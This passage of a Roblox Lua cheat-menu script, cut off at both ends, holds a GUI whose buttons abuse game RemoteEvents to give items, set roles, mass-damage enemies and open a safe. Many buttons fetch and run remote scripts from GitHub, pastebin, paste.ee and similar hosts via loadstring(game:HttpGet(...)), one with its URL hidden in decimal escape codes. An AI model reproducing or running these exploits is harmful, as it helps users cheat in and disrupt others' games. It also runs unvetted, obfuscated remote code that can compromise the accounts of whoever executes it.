               Text = "You were flung. Neutralizing velocity.";
               Color = Color3.fromRGB(255, 0, 0);
           })
       elseif PrimaryPart.AssemblyLinearVelocity.Magnitude < 50 or PrimaryPart.AssemblyAngularVelocity.Magnitude > 50 then
           LastPosition = PrimaryPart.CFrame
       end
   end)
end)
end)

Section:NewButton("Break in script", "Okeh", function()
    -- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Close = Instance.new("Frame")
local Close_2 = Instance.new("TextButton")
local Open = Instance.new("Frame")
local Open_2 = Instance.new("TextButton")
local Main = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local TextLabel_2 = Instance.new("TextLabel")
local Chips = Instance.new("TextButton")
local Cola = Instance.new("TextButton")
local Bat = Instance.new("TextButton")
local Apple = Instance.new("TextButton")
local MedKit = Instance.new("TextButton")
local Pizza = Instance.new("TextButton")
local Cookie = Instance.new("TextButton")
local EpicPizza = Instance.new("TextButton")
local Key = Instance.new("TextButton")
local Teddy = Instance.new("TextButton")
local Sword = Instance.new("TextButton")
local TextLabel_3 = Instance.new("TextLabel")
local Basement = Instance.new("TextButton")
local House = Instance.new("TextButton")
local Store = Instance.new("TextButton")
local Attic = Instance.new("TextButton")
local Sewer = Instance.new("TextButton")
local BossRoom = Instance.new("TextButton")
local TextLabel_4 = Instance.new("TextLabel")
local Police = Instance.new("TextButton")
local Swat = Instance.new("TextButton")
local TextLabel_5 = Instance.new("TextLabel")
local Cat = Instance.new("TextButton")
local KillEnemies = Instance.new("TextButton")
local Heal = Instance.new("TextButton")
local RemoveTools = Instance.new("TextButton")
local OpenSafe = Instance.new("TextButton")
local ToolDrop = Instance.new("TextButton")
local TextLabel_6 = Instance.new("TextLabel")
local Hammer = Instance.new("TextButton")
local Cure = Instance.new("TextButton")
local Plank = Instance.new("TextButton")
local Lollipop = Instance.new("TextButton")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

Close.Name = "Close"
Close.Parent = ScreenGui
Close.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
Close.BorderSizePixel = 0
Close.Position = UDim2.new(0.920255184, 0, 0.747491658, 0)
Close.Size = UDim2.new(0, 100, 0, 43)
Close.Visible = false

Close_2.Name = "Close"
Close_2.Parent = Close
Close_2.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
Close_2.BorderSizePixel = 0
Close_2.Size = UDim2.new(0, 102, 0, 42)
Close_2.Font = Enum.Font.SourceSans
Close_2.Text = "CLOSE"
Close_2.TextColor3 = Color3.fromRGB(255, 255, 255)
Close_2.TextScaled = true
Close_2.TextSize = 14.000
Close_2.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
Close_2.TextWrapped = true
Close_2.MouseButton1Down:connect(function()
Open.Visible = true
Main.Visible = false
Close.Visible = false
end)


Open.Name = "Open"
Open.Parent = ScreenGui
Open.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
Open.BorderSizePixel = 0
Open.Position = UDim2.new(0.920255184, 0, 0.67558527, 0)
Open.Size = UDim2.new(0, 102, 0, 43)

Open_2.Name = "Open"
Open_2.Parent = Open
Open_2.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
Open_2.BorderSizePixel = 0
Open_2.Position = UDim2.new(0, 0, 0.023255825, 0)
Open_2.Size = UDim2.new(0, 102, 0, 42)
Open_2.Font = Enum.Font.SourceSans
Open_2.Text = "OPEN"
Open_2.TextColor3 = Color3.fromRGB(255, 255, 255)
Open_2.TextScaled = true
Open_2.TextSize = 14.000
Open_2.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
Open_2.TextWrapped = true
Open_2.MouseButton1Down:connect(function()
Open.Visible = false
Main.Visible = true
Close.Visible = true
end)


Main.Name = "Main"
Main.Parent = ScreenGui
Main.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
Main.BorderSizePixel = 0
Main.Position = UDim2.new(0.439997613, 0, 0.0217391308, 0)
Main.Size = UDim2.new(0, 383, 0, 486)
Main.Visible = false
Main.Active = true
Main.Draggable = true

TextLabel.Parent = Main
TextLabel.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.237597913, 0, 0.102880664, 0)
TextLabel.Size = UDim2.new(0, 200, 0, 50)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "Give Items"
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true

TextLabel_2.Parent = Main
TextLabel_2.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
TextLabel_2.BorderSizePixel = 2
TextLabel_2.Size = UDim2.new(0, 383, 0, 50)
TextLabel_2.Font = Enum.Font.SourceSans
TextLabel_2.Text = "GUI:MaGiXx"
TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 14.000
TextLabel_2.TextWrapped = true

Chips.Name = "Chips"
Chips.Parent = Main
Chips.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
Chips.BorderSizePixel = 0
Chips.Position = UDim2.new(0.0496083796, 0, 0.205761328, 0)
Chips.Size = UDim2.new(0, 78, 0, 23)
Chips.Font = Enum.Font.SourceSans
Chips.Text = "Chips"
Chips.TextColor3 = Color3.fromRGB(0, 0, 0)
Chips.TextScaled = true
Chips.TextSize = 14.000
Chips.TextWrapped = true

Cola.Name = "Cola"
Cola.Parent = Main
Cola.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
Cola.BorderSizePixel = 0
Cola.Position = UDim2.new(0.318537891, 0, 0.203703716, 0)
Cola.Size = UDim2.new(0, 78, 0, 23)
Cola.Font = Enum.Font.SourceSans
Cola.Text = "Cola"
Cola.TextColor3 = Color3.fromRGB(0, 0, 0)
Cola.TextScaled = true
Cola.TextSize = 14.000
Cola.TextWrapped = true

Bat.Name = "Bat"
Bat.Parent = Main
Bat.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
Bat.BorderSizePixel = 0
Bat.Position = UDim2.new(0.556135774, 0, 0.203703716, 0)
Bat.Size = UDim2.new(0, 78, 0, 23)
Bat.Font = Enum.Font.SourceSans
Bat.Text = "Bat"
Bat.TextColor3 = Color3.fromRGB(0, 0, 0)
Bat.TextScaled = true
Bat.TextSize = 14.000
Bat.TextWrapped = true

Apple.Name = "Apple"
Apple.Parent = Main
Apple.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
Apple.BorderSizePixel = 0
Apple.Position = UDim2.new(0.796344638, 0, 0.205761328, 0)
Apple.Size = UDim2.new(0, 78, 0, 23)
Apple.Font = Enum.Font.SourceSans
Apple.Text = "Apple"
Apple.TextColor3 = Color3.fromRGB(0, 0, 0)
Apple.TextScaled = true
Apple.TextSize = 14.000
Apple.TextWrapped = true

MedKit.Name = "MedKit"
MedKit.Parent = Main
MedKit.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
MedKit.BorderSizePixel = 0
MedKit.Position = UDim2.new(0.0496083796, 0, 0.269547343, 0)
MedKit.Size = UDim2.new(0, 78, 0, 23)
MedKit.Font = Enum.Font.SourceSans
MedKit.Text = "MedKit"
MedKit.TextColor3 = Color3.fromRGB(0, 0, 0)
MedKit.TextScaled = true
MedKit.TextSize = 14.000
MedKit.TextWrapped = true

Pizza.Name = "Pizza"
Pizza.Parent = Main
Pizza.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
Pizza.BorderSizePixel = 0
Pizza.Position = UDim2.new(0.318537891, 0, 0.269547343, 0)
Pizza.Size = UDim2.new(0, 78, 0, 23)
Pizza.Font = Enum.Font.SourceSans
Pizza.Text = "Pizza"
Pizza.TextColor3 = Color3.fromRGB(0, 0, 0)
Pizza.TextScaled = true
Pizza.TextSize = 14.000
Pizza.TextWrapped = true

Cookie.Name = "Cookie"
Cookie.Parent = Main
Cookie.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
Cookie.BorderSizePixel = 0
Cookie.Position = UDim2.new(0.556135774, 0, 0.269547343, 0)
Cookie.Size = UDim2.new(0, 78, 0, 23)
Cookie.Font = Enum.Font.SourceSans
Cookie.Text = "Cookie"
Cookie.TextColor3 = Color3.fromRGB(0, 0, 0)
Cookie.TextScaled = true
Cookie.TextSize = 14.000
Cookie.TextWrapped = true

EpicPizza.Name = "EpicPizza"
EpicPizza.Parent = Main
EpicPizza.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
EpicPizza.BorderSizePixel = 0
EpicPizza.Position = UDim2.new(0.796344638, 0, 0.269547343, 0)
EpicPizza.Size = UDim2.new(0, 78, 0, 23)
EpicPizza.Font = Enum.Font.SourceSans
EpicPizza.Text = "EpicPizza"
EpicPizza.TextColor3 = Color3.fromRGB(0, 0, 0)
EpicPizza.TextScaled = true
EpicPizza.TextSize = 14.000
EpicPizza.TextWrapped = true

Key.Name = "Key"
Key.Parent = Main
Key.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
Key.BorderSizePixel = 0
Key.Position = UDim2.new(0.0496083535, 0, 0.335390985, 0)
Key.Size = UDim2.new(0, 54, 0, 23)
Key.Font = Enum.Font.SourceSans
Key.Text = "Key"
Key.TextColor3 = Color3.fromRGB(0, 0, 0)
Key.TextScaled = true
Key.TextSize = 14.000
Key.TextWrapped = true

Teddy.Name = "Teddy"
Teddy.Parent = Main
Teddy.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
Teddy.BorderSizePixel = 0
Teddy.Position = UDim2.new(0.386422962, 0, 0.333333373, 0)
Teddy.Size = UDim2.new(0, 52, 0, 23)
Teddy.Font = Enum.Font.SourceSans
Teddy.Text = "Teddy"
Teddy.TextColor3 = Color3.fromRGB(0, 0, 0)
Teddy.TextScaled = true
Teddy.TextSize = 14.000
Teddy.TextWrapped = true

Sword.Name = "Sword"
Sword.Parent = Main
Sword.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
Sword.BorderSizePixel = 0
Sword.Position = UDim2.new(0.195822448, 0, 0.335390955, 0)
Sword.Size = UDim2.new(0, 52, 0, 23)
Sword.Font = Enum.Font.SourceSans
Sword.Text = "Sword"
Sword.TextColor3 = Color3.fromRGB(0, 0, 0)
Sword.TextScaled = true
Sword.TextSize = 14.000
Sword.TextWrapped = true

TextLabel_3.Parent = Main
TextLabel_3.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
TextLabel_3.BorderSizePixel = 0
TextLabel_3.Position = UDim2.new(0.253263712, 0, 0.401234567, 0)
TextLabel_3.Size = UDim2.new(0, 200, 0, 30)
TextLabel_3.Font = Enum.Font.SourceSans
TextLabel_3.Text = "Teleports"
TextLabel_3.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_3.TextScaled = true
TextLabel_3.TextSize = 14.000
TextLabel_3.TextWrapped = true

Basement.Name = "Basement"
Basement.Parent = Main
Basement.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
Basement.BorderSizePixel = 0
Basement.Position = UDim2.new(0.0939948037, 0, 0.460905373, 0)
Basement.Size = UDim2.new(0, 78, 0, 23)
Basement.Font = Enum.Font.SourceSans
Basement.Text = "Basement"
Basement.TextColor3 = Color3.fromRGB(0, 0, 0)
Basement.TextScaled = true
Basement.TextSize = 14.000
Basement.TextWrapped = true

House.Name = "House"
House.Parent = Main
House.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
House.BorderSizePixel = 0
House.Position = UDim2.new(0.302872092, 0, 0.460905373, 0)
House.Size = UDim2.new(0, 78, 0, 23)
House.Font = Enum.Font.SourceSans
House.Text = "House"
House.TextColor3 = Color3.fromRGB(0, 0, 0)
House.TextScaled = true
House.TextSize = 14.000
House.TextWrapped = true

Store.Name = "Store"
Store.Parent = Main
Store.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
Store.BorderSizePixel = 0
Store.Position = UDim2.new(0.691905975, 0, 0.460905373, 0)
Store.Size = UDim2.new(0, 78, 0, 23)
Store.Font = Enum.Font.SourceSans
Store.Text = "Store"
Store.TextColor3 = Color3.fromRGB(0, 0, 0)
Store.TextScaled = true
Store.TextSize = 14.000
Store.TextWrapped = true

Attic.Name = "Attic"
Attic.Parent = Main
Attic.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
Attic.BorderSizePixel = 0
Attic.Position = UDim2.new(0.488250613, 0, 0.460905373, 0)
Attic.Size = UDim2.new(0, 78, 0, 23)
Attic.Font = Enum.Font.SourceSans
Attic.Text = "Attic"
Attic.TextColor3 = Color3.fromRGB(0, 0, 0)
Attic.TextScaled = true
Attic.TextSize = 14.000
Attic.TextWrapped = true

Sewer.Name = "Sewer"
Sewer.Parent = Main
Sewer.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
Sewer.BorderSizePixel = 0
Sewer.Position = UDim2.new(0.177545696, 0, 0.506172895, 0)
Sewer.Size = UDim2.new(0, 67, 0, 23)
Sewer.Font = Enum.Font.SourceSans
Sewer.Text = "Sewer"
Sewer.TextColor3 = Color3.fromRGB(0, 0, 0)
Sewer.TextScaled = true
Sewer.TextSize = 14.000
Sewer.TextWrapped = true

BossRoom.Name = "BossRoom"
BossRoom.Parent = Main
BossRoom.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
BossRoom.BorderSizePixel = 0
BossRoom.Position = UDim2.new(0.570496082, 0, 0.506172895, 0)
BossRoom.Size = UDim2.new(0, 67, 0, 23)
BossRoom.Font = Enum.Font.SourceSans
BossRoom.TextColor3 = Color3.fromRGB(0, 0, 0)
BossRoom.TextScaled = true
BossRoom.TextSize = 14.000
BossRoom.TextWrapped = true
BossRoom.Text = "BossRoom"

TextLabel_4.Parent = Main
TextLabel_4.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
TextLabel_4.BorderSizePixel = 0
TextLabel_4.Position = UDim2.new(0.253263712, 0, 0.557613134, 0)
TextLabel_4.Size = UDim2.new(0, 200, 0, 30)
TextLabel_4.Font = Enum.Font.SourceSans
TextLabel_4.Text = "Roles"
TextLabel_4.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_4.TextScaled = true
TextLabel_4.TextSize = 14.000
TextLabel_4.TextWrapped = true

Police.Name = "Police"
Police.Parent = Main
Police.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
Police.BorderSizePixel = 0
Police.Position = UDim2.new(0.191906005, 0, 0.617284, 0)
Police.Size = UDim2.new(0, 67, 0, 23)
Police.Font = Enum.Font.SourceSans
Police.Text = "Police"
Police.TextColor3 = Color3.fromRGB(0, 0, 0)
Police.TextScaled = true
Police.TextSize = 14.000
Police.TextWrapped = true

Swat.Name = "Swat"
Swat.Parent = Main
Swat.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
Swat.BorderSizePixel = 0
Swat.Position = UDim2.new(0.5992167, 0, 0.617284, 0)
Swat.Size = UDim2.new(0, 67, 0, 23)
Swat.Font = Enum.Font.SourceSans
Swat.Text = "Swat"
Swat.TextColor3 = Color3.fromRGB(0, 0, 0)
Swat.TextScaled = true
Swat.TextSize = 14.000
Swat.TextWrapped = true

TextLabel_5.Parent = Main
TextLabel_5.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
TextLabel_5.BorderSizePixel = 0
TextLabel_5.Position = UDim2.new(0.237597913, 0, 0.685185134, 0)
TextLabel_5.Size = UDim2.new(0, 200, 0, 30)
TextLabel_5.Font = Enum.Font.SourceSans
TextLabel_5.Text = "Remotes"
TextLabel_5.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_5.TextScaled = true
TextLabel_5.TextSize = 14.000
TextLabel_5.TextWrapped = true

Cat.Name = "Cat"
Cat.Parent = Main
Cat.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
Cat.BorderSizePixel = 0
Cat.Position = UDim2.new(0.108355083, 0, 0.744856, 0)
Cat.Size = UDim2.new(0, 67, 0, 23)
Cat.Font = Enum.Font.SourceSans
Cat.Text = "Cat"
Cat.TextColor3 = Color3.fromRGB(0, 0, 0)
Cat.TextScaled = true
Cat.TextSize = 14.000
Cat.TextWrapped = true

KillEnemies.Name = "KillEnemies"
KillEnemies.Parent = Main
KillEnemies.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
KillEnemies.BorderSizePixel = 0
KillEnemies.Position = UDim2.new(0.31723237, 0, 0.744856, 0)
KillEnemies.Size = UDim2.new(0, 67, 0, 23)
KillEnemies.Font = Enum.Font.SourceSans
KillEnemies.Text = "KillEnemies"
KillEnemies.TextColor3 = Color3.fromRGB(0, 0, 0)
KillEnemies.TextScaled = true
KillEnemies.TextSize = 14.000
KillEnemies.TextWrapped = true

Heal.Name = "Heal"
Heal.Parent = Main
Heal.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
Heal.BorderSizePixel = 0
Heal.Position = UDim2.new(0.570496082, 0, 0.744856, 0)
Heal.Size = UDim2.new(0, 67, 0, 23)
Heal.Font = Enum.Font.SourceSans
Heal.Text = "Heal"
Heal.TextColor3 = Color3.fromRGB(0, 0, 0)
Heal.TextScaled = true
Heal.TextSize = 14.000
Heal.TextWrapped = true

RemoveTools.Name = "RemoveTools"
RemoveTools.Parent = Main
RemoveTools.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
RemoveTools.BorderSizePixel = 0
RemoveTools.Position = UDim2.new(0.795039177, 0, 0.744856, 0)
RemoveTools.Size = UDim2.new(0, 67, 0, 23)
RemoveTools.Font = Enum.Font.SourceSans
RemoveTools.Text = "RemoveTools"
RemoveTools.TextColor3 = Color3.fromRGB(0, 0, 0)
RemoveTools.TextScaled = true
RemoveTools.TextSize = 14.000
RemoveTools.TextWrapped = true

OpenSafe.Name = "OpenSafe"
OpenSafe.Parent = Main
OpenSafe.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
OpenSafe.BorderSizePixel = 0
OpenSafe.Position = UDim2.new(0.570496082, 0, 0.820987701, 0)
OpenSafe.Size = UDim2.new(0, 67, 0, 23)
OpenSafe.Font = Enum.Font.SourceSans
OpenSafe.Text = "OpenSafe"
OpenSafe.TextColor3 = Color3.fromRGB(0, 0, 0)
OpenSafe.TextScaled = true
OpenSafe.TextSize = 14.000
OpenSafe.TextWrapped = true

ToolDrop.Name = "ToolDrop"
ToolDrop.Parent = Main
ToolDrop.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
ToolDrop.BorderSizePixel = 0
ToolDrop.Position = UDim2.new(0.31723237, 0, 0.820987701, 0)
ToolDrop.Size = UDim2.new(0, 67, 0, 23)
ToolDrop.Font = Enum.Font.SourceSans
ToolDrop.Text = "ToolDrop"
ToolDrop.TextColor3 = Color3.fromRGB(0, 0, 0)
ToolDrop.TextScaled = true
ToolDrop.TextSize = 14.000
ToolDrop.TextWrapped = true

TextLabel_6.Parent = Main
TextLabel_6.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
TextLabel_6.BorderSizePixel = 2
TextLabel_6.Position = UDim2.new(-0.0026109661, 0, 0.893004119, 0)
TextLabel_6.Size = UDim2.new(0, 383, 0, 50)
TextLabel_6.Font = Enum.Font.SourceSans
TextLabel_6.Text = "GUI:MaGiXx"
TextLabel_6.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_6.TextScaled = true
TextLabel_6.TextSize = 14.000
TextLabel_6.TextWrapped = true

Hammer.Name = "Hammer"
Hammer.Parent = Main
Hammer.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
Hammer.BorderSizePixel = 0
Hammer.Position = UDim2.new(0.556135774, 0, 0.337448567, 0)
Hammer.Size = UDim2.new(0, 46, 0, 23)
Hammer.Font = Enum.Font.SourceSans
Hammer.Text = "Hammer"
Hammer.TextColor3 = Color3.fromRGB(0, 0, 0)
Hammer.TextScaled = true
Hammer.TextSize = 14.000
Hammer.TextWrapped = true

Cure.Name = "Cure"
Cure.Parent = Main
Cure.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
Cure.BorderSizePixel = 0
Cure.Position = UDim2.new(0.710182786, 0, 0.337448567, 0)
Cure.Size = UDim2.new(0, 47, 0, 23)
Cure.Font = Enum.Font.SourceSans
Cure.Text = "Cure"
Cure.TextColor3 = Color3.fromRGB(0, 0, 0)
Cure.TextScaled = true
Cure.TextSize = 14.000
Cure.TextWrapped = true

Plank.Name = "Plank"
Plank.Parent = Main
Plank.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
Plank.BorderSizePixel = 0
Plank.Position = UDim2.new(0.845952988, 0, 0.337448567, 0)
Plank.Size = UDim2.new(0, 47, 0, 23)
Plank.Font = Enum.Font.SourceSans
Plank.Text = "Plank"
Plank.TextColor3 = Color3.fromRGB(0, 0, 0)
Plank.TextScaled = true
Plank.TextSize = 14.000
Plank.TextWrapped = true

Lollipop.Name = "Lollipop"
Lollipop.Parent = Main
Lollipop.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
Lollipop.BorderSizePixel = 0
Lollipop.Position = UDim2.new(0.8328982, 0, 0.156378597, 0)
Lollipop.Size = UDim2.new(0, 52, 0, 23)
Lollipop.Font = Enum.Font.SourceSans
Lollipop.Text = "Lollipop"
Lollipop.TextColor3 = Color3.fromRGB(0, 0, 0)
Lollipop.TextScaled = true
Lollipop.TextSize = 14.000
Lollipop.TextWrapped = true

--Script GUI:MAGIXX:

Chips.MouseButton1Down:connect(function()
    game.ReplicatedStorage.RemoteEvents.GiveTool:FireServer("Chips")
end)

Cola.MouseButton1Down:connect(function()
    game.ReplicatedStorage.RemoteEvents.GiveTool:FireServer("BloxyCola")
end)

Police.MouseButton1Down:connect(function()
    local A_1 = "Gun"
local A_2 = true
local Event = game:GetService("ReplicatedStorage").RemoteEvents.OutsideRole
Event:FireServer(A_1, A_2)
end)

Swat.MouseButton1Down:connect(function()
local A_1 = "SwatGun"
local A_2 = true
local Event = game:GetService("ReplicatedStorage").RemoteEvents.OutsideRole
Event:FireServer(A_1, A_2)
end)

Bat.MouseButton1Down:connect(function()
    game.ReplicatedStorage.RemoteEvents.GiveTool:FireServer("Bat")
end)

Apple.MouseButton1Down:connect(function()
    game.ReplicatedStorage.RemoteEvents.GiveTool:FireServer("Apple")
end)

MedKit.MouseButton1Down:connect(function()
    game.ReplicatedStorage.RemoteEvents.GiveTool:FireServer("MedKit")
end)

Pizza.MouseButton1Down:connect(function()
    game.ReplicatedStorage.RemoteEvents.GiveTool:FireServer("Pizza2")
end)

Cookie.MouseButton1Down:connect(function()
    game.ReplicatedStorage.RemoteEvents.GiveTool:FireServer("Cookie")
end)

EpicPizza.MouseButton1Down:connect(function()
    game.ReplicatedStorage.RemoteEvents.GiveTool:FireServer("EpicPizza")
end)

Key.MouseButton1Down:connect(function()
    game.ReplicatedStorage.RemoteEvents.GiveTool:FireServer("Key")
end)

Teddy.MouseButton1Down:connect(function()
    game.ReplicatedStorage.RemoteEvents.GiveTool:FireServer("TeddyBloxpin")
end)

Sword.MouseButton1Down:connect(function()
    game.ReplicatedStorage.RemoteEvents.GiveTool:FireServer("LinkedSword")
end)

Basement.MouseButton1Down:connect(function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(71, -15, -163)
end)

House.MouseButton1Down:connect(function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-36, 3, -200)
end)

Attic.MouseButton1Down:connect(function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-16, 35, -220)
end)

Store.MouseButton1Down:connect(function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-422, 3, -121)
end)

Sewer.MouseButton1Down:connect(function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(129, 3, -125)
end)

BossRoom.MouseButton1Down:connect(function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-39, -287, -1480)
end)

Cat.MouseButton1Down:connect(function()
    local Target = game:GetService("ReplicatedStorage").RemoteEvents.Cattery;
    Target:FireServer();
end)

KillEnemies.MouseButton1Down:connect(function()
    for i,v in pairs(game.Workspace.BadGuys:GetChildren()) do
        for i = 1, 50 do
            game:GetService("ReplicatedStorage").RemoteEvents.HitBadguy:FireServer(v,10)
            game:GetService("ReplicatedStorage").RemoteEvents.HitBadguy:FireServer(v,996)
            game:GetService("ReplicatedStorage").RemoteEvents.HitBadguy:FireServer(v,9)
            game:GetService("ReplicatedStorage").RemoteEvents.HitBadguy:FireServer(v,8)
            game:GetService("ReplicatedStorage").RemoteEvents.HitBadguy:FireServer(v,996)
        end
    end
end)

Heal.MouseButton1Down:connect(function()
    for i = 1, 200 do
        wait(0.0001)
        local A_1 = "Cat"
        local Event = game:GetService("ReplicatedStorage").RemoteEvents.Energy
        Event:FireServer(A_1)
    end
end)

RemoveTools.MouseButton1Down:connect(function()
for i,v in pairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
        if v:IsA("Tool") then
            v:Destroy()
        end
    end
end)

ToolDrop.MouseButton1Down:connect(function()
    while wait(1) do
        for i,v in pairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
            if v:IsA("Tool") then
                v.CanBeDropped = true
            end
        end
    end
end)

OpenSafe.MouseButton1Down:connect(function()
    game.ReplicatedStorage.RemoteEvents.Safe:FireServer(game:GetService("Workspace").CodeNote.SurfaceGui.TextLabel.Text)
end)

Cure.MouseButton1Down:connect(function()
game.ReplicatedStorage.RemoteEvents.GiveTool:FireServer("Cure")
end)

Hammer.MouseButton1Down:connect(function()
local A_1 = true
local A_2 = "Hammer"
local Event = game:GetService("ReplicatedStorage").RemoteEvents.BasementWeapon
Event:FireServer(A_1, A_2)
end)

Plank.MouseButton1Down:connect(function()
game.ReplicatedStorage.RemoteEvents.GiveTool:FireServer("Plank")
end)

Lollipop.MouseButton1Down:connect(function()
game.ReplicatedStorage.RemoteEvents.GiveTool:FireServer("Lollipop")
end)
end)

Section:NewButton("Vehicle Legends Auto farm Gui Op", "Idk", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Marco8642/science/main/Vehicle%20legends", true))()
end)
Section:NewButton("GhostPlayers Natural disaster script", "Credit to GhostPlayer", function()
    loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\39\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\105\100\50\88\104\119\81\68\39\41\41\40\41\10")()
end)
Section:NewButton("Nexus Gui Prison Life Script", "Prison life", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/GwnStefano/NexusHub/main/Main", true))()
end)
Section:NewButton("HarshTech V7.3 EXTREME OP (READ INFO)", "Credits To yellowgregprogram", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/YellowGreg/HarshTechV7.3/main/HarshTechV7.3"))()
end)



LocalSection:NewButton("First Person", "idk if people will use this", function()
    -- initialize local variables
local camera = workspace.CurrentCamera
local player = game.Players.LocalPlayer
local character = player.Character
local humanoid = character.Humanoid

-- camera settings
player.CameraMaxZoomDistance = 0.5 -- force first person
camera.FieldOfView = 100
humanoid.CameraOffset = Vector3.new(0, 0, -1)

-- set and keep every body part Transparency to its real transparency
for childIndex, child in pairs(character:GetChildren()) do
	if child:IsA("BasePart") and child.Name ~= "Head" then
		
		child:GetPropertyChangedSignal("LocalTransparencyModifier"):Connect(function()
			child.LocalTransparencyModifier = child.Transparency
		end)
		
		child.LocalTransparencyModifier = child.Transparency
		
	end
end

-- if the player steps in a vehicle
camera:GetPropertyChangedSignal("CameraSubject"):Connect(function()
	if camera.CameraSubject:IsA("VehicleSeat") then
		camera.CameraSubject = humanoid
	end
end)
end)

Section:NewButton("Fe Mouse + Keyboard", "Usefull for some pc games", function()
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/manimcool21/MOSUE-TEST/main/Protected%20(13).lua'),true))()

loadstring(game:HttpGet(('https://raw.githubusercontent.com/manimcool21/Keyboard-FE/main/Protected%20(3).lua'),true))()
end)
Section:NewButton("Hercules Gui (Prison Life script)", "Hercules", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/dJ6tcE7h", true))()
end)
End1Section:NewButton("Sussy Hub", "Contains 18+ things!", function()
    loadstring(game:HttpGet(('https://gist.githubusercontent.com/Nilrogram/8b0c8bd710be142f383c71f79279752c/raw/e4fb01a7de7cd498bb53270d2ad191dfab268a88/FE%2520SussyHub'),true))();
end)
End1Section:NewButton("Moster Hub", "Monster", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ayam196/savety/main/My%20Moster%20Hub%20V1"))();
end)
End1Section:NewButton("Carl Hub (Dahood script)", "Carl is pro", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/carlcoded/carlispro/main/carlhub'))()
end)
End1Section:NewButton("Rtx Hub", "Vibez", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Freeze-Tool-Test.md/main/RTX%20Gui%20Hub.md'))()
end)
End1Section:NewButton("Saza Hub Pet simulator X", "dont know if it work", function()
    loadstring(game:HttpGet"https://scriptblox.com/raw/SAZA-HUB_496")()
end)
End1Section:NewButton("Shushi Hub", "I like shushi", function()
    loadstring(game:HttpGet("https://paste.ee/r/bf5oO", true))()
end)
End1Section:NewButton("Rose Hub", "🌹🌹", function()
    local start = tick()
print("Rose Hub process started.")
local VERSION = "3.0.5"
local delete = {"Rose Hub 3.0.0", "Introooo", "ColorPick"}
local tweening = false
local scriptsTabText = ""
local guiTabText = ""
local darkBack = false
local lightBack = true
local tweenService = game:GetService("TweenService")
local tweenSpeed = 0.70
local colorPickerOpen = false
local backColor = Color3.fromRGB(255, 255, 255)
local lightColor = Color3.fromRGB(255, 255, 255)
local darkColor = Color3.fromRGB(150, 150, 150)
